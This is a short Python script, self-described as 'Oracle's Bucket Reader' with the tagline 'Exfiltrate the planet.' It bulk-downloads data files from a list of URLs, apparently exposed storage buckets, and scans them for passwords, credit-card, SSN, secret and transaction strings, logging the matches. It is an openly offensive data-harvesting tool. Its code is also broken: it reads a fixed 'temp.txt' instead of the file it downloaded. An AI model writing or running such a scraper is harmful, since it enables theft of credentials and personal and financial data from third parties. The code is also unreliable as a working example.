import os
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlsplit

print("""
.___________. __    __   _______      ______   .______          ___       ______  __       _______ 
|           ||  |  |  | |   ____|    /  __  \  |   _  \        /   \     /      ||  |     |   ____|
`---|  |----`|  |__|  | |  |__      |  |  |  | |  |_)  |      /  ^  \   |  ,----'|  |     |  |__   
    |  |     |   __   | |   __|     |  |  |  | |      /      /  /_\  \  |  |     |  |     |   __|  
    |  |     |  |  |  | |  |____    |  `--'  | |  |\  \----./  _____  \ |  `----.|  `----.|  |____ 
    |__|     |__|  |__| |_______|    \______/  | _| `._____/__/     \__\ \______||_______||_______|
""")
print("Oracle's Bucket Reader")
print("Exfiltrate the planet. :)")
print("Change file_paths.txt if you want to do ext_paths.txt instead.")
print("There is a default of 10 threads, feel free to increase it at the bottom of the code.")

# Read file paths from file_paths.txt
with open('file_paths.txt', 'r') as f:
    file_paths = f.readlines()

# Function to download and process a file
def extractFile(file_path):
    file_path = file_path.strip()
    # parse the url
    url = urlsplit(file_path)
    filename, ext = os.path.splitext(os.path.basename(url.path))
    #Change below depending on what files you want read.
    if ext not in ['.txt', '.csv', '.log', '.db', '.sql']:
        return

    # Download file
    urllib.request.urlretrieve(file_path, filename)

    # Search for keywords
    keywords = ['password', 'credit', 'key', 'social', 'ssn', 'transaction','secret']
    match = False
    with open('temp.txt', 'r') as f:
        for line in f:
            for keyword in keywords:
                if keyword in line:
                    match = True
                    print(line)
                    with open('log.txt', 'a') as log:
                        log.write(line)
                    break
            if match:
                break
    if not match:
        os.remove(filename)

# Create thread pool with a fixed number of threads
with ThreadPoolExecutor(max_workers=10) as executor:
    # Start threads
    executor.map(extractFile, file_paths)
